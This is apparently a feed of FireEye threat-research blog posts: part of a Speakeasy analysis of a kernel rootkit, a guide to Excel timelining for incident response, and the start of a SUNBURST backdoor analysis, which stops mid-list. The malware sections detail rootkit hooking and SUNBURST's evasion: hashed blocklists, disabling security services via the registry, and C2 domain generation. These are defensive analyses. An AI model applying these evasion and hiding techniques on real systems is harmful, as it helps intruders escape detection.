  (and therefore a valid candidate for an APC). Figure 7 shows the
  memory read event that was logged when the Winnti malware manually
  parsed an <span class="code">ETHREAD</span> structure in the
  services.exe process to confirm it was alertable. At the time of this
  writing, all threads within the emulator present themselves as
  alertable by default.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Event logged when the
    tcprelay.sys malware confirmed a thread was alertable</span></p>
 <p>Next, the malware can execute any user mode code it wants using this
  thread object. The undocumented functions <span
  class="code">KeInitializeApc</span> and <span
  class="code">KeInsertQueueApc</span> will initialize and execute a
  user mode APC respectively. Figure 8 shows the API set that the
  malware uses to inject a user mode module into the services.exe
  process. The malware executes a shellcode stub as the target of the
  APC that will then execute a loader for the injected DLL. All of this
  can be recovered from the memory dump package and analyzed later.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: Logged APIs used by
    tcprelay.sys rootkit to inject into user mode via an APC</span></p>
 <h4>Network Hooks</h4>
 <p>After injecting into user mode, the kernel component will attempt to
  install network obfuscation hooks (presumably to hide the user mode
  implant). Speakeasy tracks and tags all memory within the emulation
  space. In the context of kernel mode emulation, this includes all
  kernel objects (e.g. Driver and Device objects, and the kernel modules
  themselves). Immediately after we observe the malware inject its user
  mode implant, we see it begin to attempt to hook kernel components.
  This was confirmed during static analysis to be used for network hiding.</p>
 <p>The memory access section of the emulation report reveals that the
  malware modified the <span class="code">netio.sys</span> driver,
  specifically code within the exported function named <span
  class="code">NsiEnumerateObjectsAllParametersEx</span>. This function
  is ultimately called when a user on the system runs the “netstat”
  command and it is likely that the malware is hooking this function in
  order to hide connected network ports on the infected system. This
  inline hook was identified by the event captured in Figure 9.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Inline function hook set by the
    malware to hide network connections</span></p>
 <p>In addition, the malware hooks the <span class="code">Tcpip</span>
  driver object in order to accomplish additional network hiding.
  Specifically, the malware hooks the <span
  class="code">IRP_MJ_DEVICE_CONTROL</span> handler for the <span
  class="code">Tcpip</span> driver. User mode code may send IOCTL codes
  to this function when querying for active connections. This type of
  hook can be easily identified with Speakeasy by looking for memory
  writes to critical kernel objects as shown in Figure 10.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: Memory write event used to
    hook the Tcpip network driver</span></p>
 <h4>System Service Dispatch Table Hooks</h4>
 <p>Finally, the rootkit will attempt to hide itself using the nearly
  ancient technique of system service dispatch table (SSDT) patching.
  Speakeasy allocates a fake SSDT so malware can interact with it. The
  SSDT is a function table that exposes kernel functionality to user
  mode code. The event in Figure 11 shows that the SSDT structure was
  modified at runtime.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig11.png" alt="" />
  <br /> <span class="type-XS">Figure 11: SSDT hook detected by Speakeasy</span></p>
 <p>If we look at the malware in IDA Pro, we can confirm that the
  malware patches the SSDT entry for the <span
  class="code">ZwQueryDirectoryFile</span> and <span
  class="code">ZwEnumerateKey</span> APIs that it uses to hide itself
  from file system and registry analysis. The SSDT patch function is
  shown in Figure 12.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig12.png" alt="" />
  <br /> <span class="type-XS">Figure 12: File hiding SSDT patching
    function shown in IDA Pro</span></p>
 <p>After setting up these hooks, the system thread will exit. The other
  entry points (such as the IRP handlers and DriverUnload routines) in
  the driver are less interesting and contain mostly boilerplate driver code.</p>
 <h4>Acquiring the Injected User Mode Implant</h4>
 <p>Now that we have a good idea what the driver does to hide itself on
  the system, we can use the memory dumps created by Speakeasy to
  acquire the injected DLL discussed earlier. Opening the zip file we
  created at emulation time, we can find the memory tag referenced in
  Figure 6. We quickly confirm the memory block has a valid PE header
  and it successfully loads into IDA Pro as shown in Figure 13.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/speakeasy-emulation/fig13.png" alt="" />
  <br /> <span class="type-XS">Figure 13: Injected user mode DLL
    recovered from Speakeasy memory dump</span></p>
 <h4>Conclusion</h4>
 <p>In this blog post, we discussed how Speakeasy can be effective at
  automatically identifying rootkit activity from the kernel mode
  binary. Speakeasy can be used to quickly triage kernel binaries that
  may otherwise be difficult to dynamically analyze. For more
  information and to check out the code, head over to our <a
    href="https://github.com/fireeye/speakeasy">GitHub repository</a>.</p>
http://www.fireeye.com/blog/threat-research/2021/01/emulation-of-kernel-mode-rootkits-with-speakeasy.html2021-01-20T16:45:00.000Z2021-01-20T16:50:04.845ZExcelerating Analysis – Tips and Tricks to Analyze Data with Microsoft Excelnoemail@noemail.orgJake Nicastro<p>Incident response investigations don’t always involve standard
  host-based artifacts with fully developed parsing and analysis tools.
  At FireEye Mandiant, we frequently encounter incidents that involve a
  number of systems and solutions that utilize custom logging or
  artifact data. Determining what happened in an incident involves
  taking a dive into whatever type of data we are presented with,
  learning about it, and developing an efficient way to analyze the
  important evidence.</p>
 <p>One of the most effective tools to perform this type of analysis is
  one that is in almost everyone’s toolkit: Microsoft Excel. In this
  article we will detail some tips and tricks with Excel to perform
  analysis when presented with any type of data.</p>
 <h4>Summarizing Verbose Artifacts</h4>
 <p>Tools such as <a
    href="https://www.fireeye.com/services/freeware/redline.html">FireEye
  Redline</a> include handy timeline features to combine multiple
  artifact types into one concise timeline. When we use individual
  parsers or custom artifact formats, it may be tricky to view multiple
  types of data in the same view. Normalizing artifact data with Excel
  to a specific set of easy-to-use columns makes for a smooth
  combination of different artifact types.</p>
 <p>Consider trying to review parsed file system, event log, and
  Registry data in the same view using the following data.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="132" valign="top"><p>
          <b>$SI Created</b></p> </td> <td width="132" valign="top"><p>
          <b>$SI Modified</b></p> </td> <td width="70" valign="top"><p>
          <b>File Name</b></p> </td> <td width="187" valign="top"><p>
          <b>File Path</b></p> </td> <td width="68" valign="top"><p>
          <b>File Size</b></p> </td> <td width="230" valign="top"><p>
          <b>File MD5</b></p> </td> <td width="68" valign="top"><p>
          <b>File Attributes</b></p> </td> <td width="68" valign="top"><p>
          <b>File Deleted</b></p> </td> </tr>
    <tr>
      <td width="132" valign="top"><p>2019-10-14 23:13:04</p> </td> <td
        width="132" valign="top"><p>2019-10-14 23:33:45</p> </td> <td
        width="70" valign="top"><p>Default.rdp</p> </td> <td width="187"
          valign="top"><p>C:\Users\<br /> attacker\Documents\</p> </td>
        <td width="68" valign="top"><p>485</p> </td> <td width="230"
          valign="top"><p>c482e563df19a40<br /> 1941c99888ac2f525</p>
      </td> <td width="68" valign="top"><p>Archive</p> </td> <td
        width="68" valign="top"><p>FALSE</p> </td> </tr></tbody></table>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="92" valign="top"><p>
          <b>Event Gen Time</b></p> </td> <td width="92" valign="top"><p>
          <b>Event ID</b></p> </td> <td width="272" valign="top"><p>
          <b>Event Message</b></p> </td> <td width="48" valign="top"><p>
          <b>Event Category</b></p> </td> <td width="60" valign="top"><p>
          <b>Event User</b></p> </td> <td width="60" valign="top"><p>
          <b>Event System</b></p> </td> </tr>
    <tr>
      <td width="92" valign="top"><p>2019-10-14 23:13:06</p> </td> <td
        width="92" valign="top"><p>4648</p> </td> <td width="272"
          valign="top"><p>A logon was attempted using explicit
          credentials.<br /> <br /> Subject:<br />    Security ID: 
          DomainCorp\Administrator<br />    Account Name: 
          Administrator<br />    Account Domain:  DomainCorp<br />   
          Logon ID:  0x1b38fe<br />    Logon GUID: 
          {00000000-0000-0000-0000-000000000000}<br /> Account Whose
          Credentials Were Used:<br />    Account Name: 
          VictimUser<br />    Account Domain:  DomainCorp<br />    Logon
          GUID:  {00000000-0000-0000-0000-000000000000}<br /> Target
          Server:<br />    Target Server Name: DestinationServer<br />
             Additional Information:<br /> Process Information:<br />   
          Process ID:  0x5ac<br />    Process Name:  C:\Program
          Files\Internet Explorer\iexplore.exe<br /> Network
          Information:<br />    Network Address: -<br />    Port:  
        -</p> </td> <td width="48" valign="top"><p>Logon</p> </td> <td
        width="60" valign="top"><p>Administrator</p> </td> <td
        width="60" valign="top"><p>SourceSystem</p> </td> </tr></tbody></table>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="97" valign="top"><p>
          <b>KeyModified</b></p> </td> <td width="282" valign="top"><p>
          <b>Key Path</b></p> </td> <td width="80" valign="top"><p>
          <b>KeyName</b></p> </td> <td width="65" valign="top"><p>
          <b>ValueName</b></p> </td> <td width="50" valign="top"><p>
          <b>ValueText</b></p> </td> <td width="50" valign="top"><p>
          <b>Type</b></p> </td> </tr>
    <tr>
      <td width="97" valign="top"><p>2019-10-14 23:33:46</p> </td> <td
        width="282"
          valign="top"><p>HKEY_USER\Software\Microsoft\Terminal Server
        Client\Servers\</p> </td> <td width="80"
        valign="top"><p>DestinationServer</p> </td> <td width="65"
        valign="top"><p>UsernameHInt</p> </td> <td width="50"
        valign="top"><p>VictimUser</p> </td> <td width="50"
        valign="top"><p>REG_SZ</p> </td> </tr></tbody></table>
 <p>Since these raw artifact data sets have different column headings
  and data types, they would be difficult to review in one timeline. If
  we format the data using Excel string concatenation, we can make the
  data easy to combine into a single timeline view. To format the data,
  we can use the “&amp;” operation with a function to join information
  we may need into a “Summary” field.</p>
 <p>An example command to join the relevant file system data delimited
  by ampersands could be “=D2 &amp; &quot; | &quot; &amp; C2 &amp;
  &quot; | &quot; &amp; E2 &amp; &quot; | &quot; &amp; F2 &amp; &quot; |
  &quot; &amp; G2 &amp; &quot; | &quot; &amp; H2”. Combining this format
  function with a “Timestamp” and “Timestamp Type” column will complete
  everything we need for streamlined analysis.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="84" valign="top"><p>
          <b>Timestamp</b></p> </td> <td width="111" valign="top"><p>
          <b>Timestamp Type</b></p> </td> <td width="429" valign="top"><p>
          <b>Event</b></p> </td> </tr>
    <tr>
      <td width="84" valign="top"><p>2019-10-14 23:13:04</p> </td> <td
        width="111" valign="top"><p>$SI Created</p> </td> <td
        width="429" valign="top"><p>C:\Users\attacker\Documents\ |
          Default.rdp | 485 | c482e563df19a401941c99888ac2f525  |
          Archive | FALSE</p> </td> </tr>
    <tr>
      <td width="84" valign="top"><p>2019-10-14 23:13:06</p> </td> <td
        width="111" valign="top"><p>Event Gen Time</p> </td> <td
        width="429" valign="top"><p>4648 | A logon was attempted using
          explicit credentials.<br /> <br /> Subject:<br />    Security
          ID:  DomainCorp\Administrator<br />    Account Name: 
          Administrator<br />    Account Domain:  DomainCorp<br />   
          Logon ID:  0x1b38fe<br />    Logon GUID: 
          {00000000-0000-0000-0000-000000000000}<br /> Account Whose
          Credentials Were Used:<br />    Account Name: 
          VictimUser<br />    Account Domain:  DomainCorp<br />    Logon
          GUID:  {00000000-0000-0000-0000-000000000000}<br /> Target
          Server:<br />    Target Server Name: DestinationServer<br />
             Additional Information:<br /> Process Information:<br />   
          Process ID:  0x5ac<br />    Process Name:  C:\Program
          Files\Internet Explorer\iexplore.exe<br /> Network
          Information:<br />    Network Address: -<br />    Port:   - |
          Logon | Administrator | SourceSystem</p> </td> </tr>
    <tr>
      <td width="84" valign="top"><p>2019-10-14 23:33:45</p> </td> <td
        width="111" valign="top"><p>$SI Modified</p> </td> <td
        width="429" valign="top"><p>C:\Users\attacker\Documents\ |
          Default.rdp | 485 | c482e563df19a401941c99888ac2f525  |
          Archive | FALSE</p> </td> </tr>
    <tr>
      <td width="84" valign="top"><p>2019-10-14 23:33:46</p> </td> <td
        width="111" valign="top"><p>KeyModified</p> </td> <td
        width="429"
          valign="top"><p>HKEY_USER\Software\Microsoft\Terminal Server
          Client\Servers\ | DestinationServer | UsernameHInt |
        VictimUser</p> </td> </tr></tbody></table>
 <p>After sorting by timestamp, we can see evidence of the
  “DomainCorp\Administrator” account connecting from “SourceSystem” to
  “DestinationServer” with the “DomainCorp\VictimUser” account via RDP
  across three artifact types.</p>
 <h4>Time Zone Conversions</h4>
 <p>One of the most critical elements of incident response and forensic
  analysis is timelining. Temporal analysis will often turn up new
  evidence by identifying events that precede or follow an event of
  interest. Equally critical is producing an accurate timeline for
  reporting. Timestamps and time zones can be frustrating, and things
  can get confusing when the systems being analyzed span various time
  zones. Mandiant tracks all timestamps in <a
    href="https://www.timeanddate.com/time/aboututc.html">Coordinated
    Universal Time (UTC)</a> format in its investigations to eliminate
  any confusion of both time zones and time adjustments such as daylight
  savings and regional summer seasons. </p>
 <p>Of course, various sources of evidence do not always log time the
  same way. Some may be local time, some may be UTC, and as mentioned,
  data from sources in various geographical locations complicates things
  further. When compiling timelines, it is important to first know
  whether the evidence source is logged in UTC or local time. If it is
  logged in local time, we need to confirm which local time zone the
  evidence source is from. Then we can use the Excel TIME()  formula to
  convert timestamps to UTC as needed.</p>
 <p>This example scenario is based on a real investigation where the
  target organization was compromised via phishing email, and employee
  direct deposit information was changed via an internal HR application.
  In this situation, we have three log sources: email receipt logs,
  application logins, and application web logs. </p>
 <p>The email logs are recorded in UTC and contain the following information:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture1.png" alt="" /></p>
 <p>The application logins are recorded in Eastern Daylight Time (EDT)
  and contain the following:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture2.png" alt="" /></p>
 <p>The application web logs are also recorded in Eastern Daylight Time
  (EDT) and contain the following:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture3.png" alt="" /></p>
 <p>To take this information and turn it into a master timeline, we can
  use the CONCAT function (an alternative to the ampersand concatenation
  used previously) to make a summary of the columns in one cell for each
  log source, such as this example formula for the email receipt logs:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture4.png" alt="" /></p>
 <p>This is where checking our time zones for each data source is
  critical. If we took the information as it is presented in the logs
  and assumed the timestamps were all in the same time zone and created
  a timeline of this information, it would look like this:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture5.png" alt="" /></p>
 <p>As it stands the previous screenshot, we have some login events to
  the HR application, which may look like normal activity for the
  employees. Then later in the day, they receive some suspicious emails.
  If this were hundreds of lines of log events, we would risk the login
  and web log events being overlooked as the time of activity precedes
  our suspected initial compromise vector by a few hours. If this were a
  timeline used for reporting, it would also be inaccurate.</p>
 <p>When we know which time zone our log sources are in, we can adjust
  the timestamps accordingly to reflect UTC. In this case, we confirmed
  through testing that the application logins and web logs are recorded
  in EDT, which is four hours behind UTC, or “UTC-4”. To change these to
  UTC time, we just need to add four hours to the time. The Excel TIME
  function makes this easy. We can just add a column to the existing
  tables, and in the first cell we type “=A2+TIME(4,0,0)”. Breaking this down:</p>
 <ul> <li>=A2<ul> <li>Reference cell A2 (in this case our EDT
        timestamp). Note this is not an absolute reference, so we can
        use this formula for the rest of the rows.</li> </ul> </li>
      <li>+TIME<ul> <li>This tells Excel to take the value of the data
        in cell A2 as a “time” value type and add the following amount
        of time to it:</li> </ul> </li> <li>(4,0,0)<ul> <li>The TIME
        function in this instance requires three values, which are, from
        left to right: hours, minutes, seconds. In this example, we are
        adding 4 hours, 0 minutes, and 0 seconds.</li> </ul> </li> </ul>
 <p>Now we have a formula that takes the EDT timestamp and adds four
  hours to it to make it UTC. Then we can replicate this formula for the
  rest of the table. The end result looks like this:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture6.png" alt="" /></p>
 <p>When we have all of our logs in the same time zone, we are ready to
  compile our master timeline. Taking the UTC timestamps and the summary
  events we made, our new, accurate timeline looks like this:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture7.png" alt="" /></p>
 <p>Now we can clearly see suspicious emails sent to (fictional)
  employees Austin and Dave. A few minutes later, Austin’s account logs
  into the HR application and adds a new bank account. After this, we
  see the same email sent to Jake. Soon after this, Jake’s account logs
  into the HR application and adds the same bank account information as
  Austin’s. Converting all our data sources to the same time zone with
  Excel allowed us to quickly link these events together and easily
  identify what the attacker did. Additionally, it provided us with more
  indicators, such as the known-bad bank account number to search for in
  the rest of the logs.</p>
 <p>Pro Tip: Be sure to account for log data spanning over changes in
  UTC offset due to regional events such as daylight savings or summer
  seasons. For example, local time zone adjustments will need to change
  for logs in United States Eastern Time from Virginia, USA from
  +TIME(5,0,0) to +TIME(4,0,0) the first weekend in March every year and
  back from +TIME(4,0,0) to +TIME(5,0,0) the first weekend in November
    <a href="https://www.timeanddate.com/time/change/usa">to account for
    daylight and standard shifts</a>.</p>
 <h4>CountIf for Log Baselining</h4>
 <p>When reviewing logs that record authentication in the form of a user
  account and timestamp, we can use COUNTIF to establish simple
  baselines to identify those user accounts with inconsistent activity.  </p>
 <p>In the example of user logons that follows, we'll use the formula
  &quot;=COUNTIF($B$2:$B$25,B2)&quot; to establish a historical
  baseline. Here is a breakdown of the parameters for this COUNTIF
  formula located in C2 in our example: </p>
 <ul> <li>COUNTIF <ul> <li>This Excel formula counts how many times a
        value exists in a range of cells. </li> </ul> </li>
      <li>$B$2:$B$25 <ul> <li>This is the entire range of all cells, B2
        through B25, that we want to use as a range to search for a
        specific value. Note the use of &quot;$&quot; to ensure that the
        start and end of the range are an <a
          href="https://www.microsoft.com/en-us/microsoft-365/blog/2011/08/17/making-sense-of-dollar-signs-in-excel/">absolute
        reference</a> and are not automatically updated by Excel if we
        copy this formula to other cells. </li> </ul> </li> <li>B2 <ul>
        <li>This is the cell that contains the value we want to search
        for and count occurrences of in our range of $B$2:$B$25. Note
        that this parameter is not an absolute reference with a
        preceding &quot;$&quot;. This allows us to <a
        href="https://support.office.com/en-us/article/copy-a-formula-by-dragging-the-fill-handle-in-excel-for-mac-dd928259-622b-473f-9a33-83aa1a63e218">fill</a> the
        formula down through all rows and ensure that we are counting
        the applicable user name. </li> </ul> </li> </ul>
 <p>To summarize, this formula will search the username column of all
  logon data and count how many times the user of each logon has logged
  on in total across all data points. </p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture8.png" alt="" /></p>
 <p>When most user accounts log on regularly, a compromised account
  being used to logon for the first time may clearly stand out when
  reviewing total log on counts. If we have a specific time frame in
  mind, it may be helpful to know which accounts first logged on during
  that time.  </p>
 <p>The COUNTIF formula can help track accounts through time to identify
  their first log on which can help identify rarely used credentials
  that were abused for a limited time frame.  </p>
 <p>We'll start with the formula &quot;=COUNTIF($B$2:$B2,B2)&quot; in
  cell D3. Here is a breakdown of the parameters  for this COUNTIF
  formula. Note that the use of &quot;$&quot; for absolute referencing
  is slightly different for the range used, and that is an importance nuance: </p>
 <ul> <li>COUNTIF <ul> <li>This Excel formula counts how many times a
        value exists in a range of cells. </li> </ul> </li>
      <li>$B$2:$B2 <ul> <li>This is the range of cells, B2 through B2,
        that we want to start with. Since we want to increase our range
        as we go through the rows of the log data, the ending cell row
        number (2 in this example) is not made absolute. As we fill this
        formula down through the rest of our log data, it will
        automatically expand the range to include the current log record
        and all previous logs. </li> </ul> </li> <li>B2 <ul> <li>This
        cell contains the value we want to search for and provides a
        count of occurrences found in our defined range. Note that this
        parameter B2 is not an absolute reference with a preceding
        &quot;$&quot;. This allows us to <a
        href="https://support.office.com/en-us/article/copy-a-formula-by-dragging-the-fill-handle-in-excel-for-mac-dd928259-622b-473f-9a33-83aa1a63e218">fill</a> the
        formula down through all rows and ensure that we are counting
        the applicable user name. </li> </ul> </li> </ul>
 <p>To summarize, this formula will search the username column of all
  logon data <b>before and including</b> the current log and count how
  many times the user of each logon has logged on up to that point in time. </p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture9.png" alt="" /></p>
 <p>The following example illustrates how Excel automatically updated
  the range for D15 to $B$2:$B15 <a
    href="https://support.office.com/en-us/article/copy-a-formula-by-dragging-the-fill-handle-in-excel-for-mac-dd928259-622b-473f-9a33-83aa1a63e218">using
    the fill handle</a>.  </p>
 <p>
  <br /> <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture10.png" alt="" /></p>
 <p>To help visualize a large data set, let's add color scale
  conditional formatting to each row individually. To do so: </p>
 <ol> <li>Select only the cells we want to compare with the color scale
    (such as D2 to D25). </li> <li>On the Home menu, click the
    Conditional Formatting button in the Styles area. </li> <li>Click
    Color Scales. </li> <li>Click the type of color scale we would like
    to use. </li> </ol>
 <p>The following examples set the lowest values to red and the highest
  values to green. We can see how: </p>
 <ul> <li>Users with lower authentication counts contrast against users
    with more authentications. </li> <li>The first authentication times
    of users stand out in red. </li> </ul>
 <p>Whichever colors are used, be careful not to assume that one color,
  such as green, implies safety and another color, such as red, implies maliciousness.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/excelerating/Picture11.png" alt="" /></p>
 <h4>Conclusion</h4>
 <p>The techniques described in this post are just a few ways to utilize
  Excel to perform analysis on arbitrary data. While these techniques
  may not leverage some of the more powerful features of Excel, as with
  any variety of skill set, mastering the fundamentals enables us to
  perform at a higher level. Employing fundamental Excel analysis
  techniques can empower an investigator to work through analysis of any
  presented data type as efficiently as possible.</p>
http://www.fireeye.com/blog/threat-research/2019/12/tips-and-tricks-to-analyze-data-with-microsoft-excel.html2019-12-03T16:00:00.000Z2021-01-08T20:36:46.400ZSUNBURST Additional Technical Detailsnoemail@noemail.orgStephen Eckels<p>FireEye has discovered additional details about the SUNBURST backdoor
  since our initial publication on Dec. 13, 2020. Before diving into the
  technical depth of this malware, we recommend readers familiarize
  themselves with our blog post about the <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html">SolarWinds
    supply chain compromise</a>, which revealed a global intrusion
  campaign by a sophisticated threat actor we are currently tracking as UNC2452.</p>
 <p>SUNBURST is a trojanized version of a digitally signed SolarWinds
  Orion plugin called <span
  class="code">SolarWinds.Orion.Core.BusinessLayer.dll</span>. The
  plugin contains a backdoor that communicates via HTTP to third party
  servers. After an initial dormant period of up to two weeks, SUNBURST
  may retrieve and execute commands that instruct the backdoor to
  transfer files, execute files, profile the system, reboot the system,
  and disable system services. The malware's network traffic attempts to
  blend in with legitimate SolarWinds activity by imitating the Orion
  Improvement Program (OIP) protocol and persistent state data is stored
  within legitimate plugin configuration files. The backdoor uses
  multiple obfuscated blocklists to identify processes, services, and
  drivers associated with forensic and anti-virus tools.</p>
 <p>In this post, the following topics are covered in greater detail:</p>
 <ul> <li>Anti-Analysis Environment Checks and Blocklists</li>
    <li>Domain Generation Algorithm and Variations</li> <li>Command and
    Control (C2) behaviors for DNS A and CNAME records</li> <li>Malware
    modes of operation</li> </ul>
 <h4>Anti-Analysis Environment Checks</h4>
 <p>Before reaching out to its C2 server, SUNBURST performs numerous
  checks to ensure no analysis tools are present. It checks process
  names, file write timestamps, and Active Directory (AD) domains before
  proceeding. We believe that these checks helped SUNBURST evade
  detection by anti-virus software and forensic investigators for seven
  months after its introduction to the SolarWinds Orion supply chain.</p>
 <p>First, the backdoor verifies that the lowercase name of the current
  process is <span class="code">solarwinds.businesslayerhost</span>.
  UNC2452 avoided including this string directly in the source code by
  computing a hash of the string and comparing the result to the 64-bit
  number <span class="code">17291806236368054941</span>. The hash value
  is calculated as a standard FNV-1A 64-bit hash with an additional XOR
  by the 64-bit number <span class="code">6605813339339102567</span>.
  The additional XOR operation forces malware analysts to develop custom
  tools to brute force the hash preimage.</p>
 <p>Next, the backdoor only executes if the filesystem last write time
  of the .NET assembly SolarWinds.Orion.Core.BusinessLayer.dll is at
  least 12 to 14 days prior to the current time. The exact threshold is
  selected randomly from this interval. In other words, SUNBURST lays
  low for almost two weeks before raising its head. If the timestamp
  check fails, the backdoor will execute again at a random later time
  when it is invoked by a legitimate recurring background task. Once the
  threshold is met, the sample creates the named pipe <span
  class="code">583da945-62af-10e8-4902-a8f205c72b2e</span> to ensure
  only one instance of the backdoor is running. If the named pipe
  already exists, the malware exits.</p>
 <p>SUNBURST stores its configuration in the legitimate <span
  class="code">SolarWinds.Orion.Core.BusinessLayer.dll.config</span>
  file. It repurposes two existing settings in the <span
  class="code">appSettings</span> section:  <span
  class="code">ReportWatcherRetry</span> and <span
  class="code">ReportWatcherPostpone</span>. During initialization, the
  backdoor determines if the <span
  class="code">ReportWatcherRetry</span> setting is the value <span
  class="code">3</span>. This value indicates the malware has been
  deactivated and will no longer perform any network activity. As we
  describe later, UNC2452 can command the backdoor to disable itself.
  This feature may be utilized when the operator determines the victim
  is not of interest or that they’ve completed their mission. When
  investigating a system compromised by SUNBURST, review this setting to
  determine if the backdoor has been disabled. Note, the presence of
  this value does not offer proof the actor did not further compromise
  the environment before disabling SUNBURST.</p>
 <p>The backdoor also determines if the system is joined to an Active
  Directory (AD) domain and, if so, retrieves the domain name. Execution
  ceases if the system is not joined to an AD domain. SUNBURST checks
  the AD domain name against a blocklist and halts execution if it
  contains one of the following values:</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="148" valign="top"><p>
          <span class="code">swdev.local</span></p> </td> <td
        width="223" valign="top"><p>
          <span class="code">emea.sales</span></p> </td> <td width="137" valign="top"><p>
          <span class="code">pci.local</span></p> </td> <td width="115" valign="top"><p>
          <span class="code">apac.lab</span></p> </td> </tr>
    <tr>
      <td width="148" valign="top"><p>
          <span class="code">swdev.dmz</span></p> </td> <td width="223" valign="top"><p>
          <span class="code">cork.lab</span></p> </td> <td width="137" valign="top"><p>
          <span class="code">saas.swi</span></p> </td> <td width="115" valign="top"><p>
          <span class="code">dmz.local</span></p> </td> </tr>
    <tr>
      <td width="148" valign="top"><p>
          <span class="code">lab.local</span></p> </td> <td width="223" valign="top"><p>
          <span class="code">dev.local</span></p> </td> <td width="137" valign="top"><p>
          <span class="code">lab.rio</span></p> </td> <td width="115" valign="top"><p>
          <span class="code">lab.brno</span></p> </td> </tr>
    <tr>
      <td width="148" valign="top"><p>
          <span class="code">lab.na</span></p> </td> <td width="223" valign="top"><p>
          <span class="code">test</span></p> </td> <td width="137" valign="top"><p>
          <span class="code">solarwinds</span></p> </td> <td
        width="115"><p> </p> </td> </tr></tbody></table>
 <p>We suspect these hard-coded AD domains may be SolarWinds internal
  domains that UNC2452 wanted to avoid.</p>
 <p>Finally, SUNBURST verifies the system has internet connectivity by
  ensuring it can resolve the DNS name <span
  class="code">api.solarwinds.com</span>. Otherwise, execution stops and
  retries at a random later time.</p>
 <h4>Anti-Analysis Blocklists</h4>
 <p>SUNBURST's behavior is affected by the presence of malware analysis
  and security software. To disguise the strings used to detect these
  security tools, UNC2452 calculated and embedded a hash value for each
  string. While it is trivial for the backdoor to check for the
  existence of a hashed process name, it is computationally expensive to
  determine what string a hash value corresponds to (the “preimage”).
  However, thanks to some hard work by members of the information
  security community, the hashes have been successfully brute-forced.
  The list of hashes and their corresponding strings can be viewed at
  this <a
    href="https://github.com/fireeye/sunburst_countermeasures/blob/main/fnv1a_xor_hashes.txt">FireEye
    GitHub page</a>.</p>
 <p>SUNBURST uses the aforementioned FNV-1A plus XOR algorithm to
  compute the hash of each process name, service name, and driver
  filename on the system.</p>
 <p>If a blocklisted process or driver name is found, SUNBURST pauses
  and tries again later. The backdoor continues past this check only
  when there are no processes nor drivers from the blocklist present.</p>
 <p>If a blocklisted service is found, SUNBURST attempts to disable the
  blocklisted service by manipulating the service configuration in the
  Windows Registry. It sets the registry value <span
  class="code">HKLM\SYSTEM\CurrentControlSet\services\&lt;service_name&gt;\Start</span>
  to the value <span class="code">4</span>, which corresponds to <span
  class="code">SERVICE_DISABLED</span>. As a result, the blocklisted
  service is disabled <i>on the next power cycle</i>. This means the
  presence of a blocklisted service on a compromised host does not make
  a system immune to SUNBURST.</p>
 <p>After the registry modification is made, SUNBURST updates the <span
  class="code">ReportWatcherPostpone</span> configuration value to
  reflect the service it disabled. Then, the backdoor pauses and retries
  the process and service blocklist checks at a later time.</p>
 <p>Subsequent service blocklist checks skip services already present in
  the <span class="code">ReportWatcherPostpone</span> configuration key.
  SUNBURST will not treat the services it has disabled as members of the
  blocklist anymore. Therefore, during an incident response, forensic
  teams should consider recovering and decoding this configuration key
  to parse out which services SUNBURST attempted to disable.</p>
 <h4>Domain Generation Algorithm</h4>
 <p>In this section we describe how SUNBURST uses an intermediary
  command and control (C2) coordinator to retrieve its final C2 server.
  The C2 coordinator instructs the backdoor to continue or halt
  beaconing. It also redirects SUNBURST to its final C2 server via DNS
  CNAME records. We believe this enables UNC2452 to compartmentalize
  their operations, limiting the network infrastructure shared among victims.</p>
 <p>The C2 coordinator is implemented as the authoritative DNS server
  for the <span class="code">avsvmcloud[.]com</span> domain. To
  communicate with the C2 coordinator, SUNBURST uses a Domain Generation
  Algorithm (DGA) to construct subdomains of <span
  class="code">avsvmcloud[.]com</span> and resolves the fully qualified
  domain names (FQDN) using the system DNS client. The backdoor
  interprets the DNS responses in an unusual way to receive orders from
  the C2 coordinator.</p>
 <p>The DGA generates subdomains with the following DNS suffixes to
  create the FQDN:</p>
 <ul> <li>
    <span
  class="code">.appsync-api.eu-west-1[.]avsvmcloud[.]com</span></li> <li>
    <span
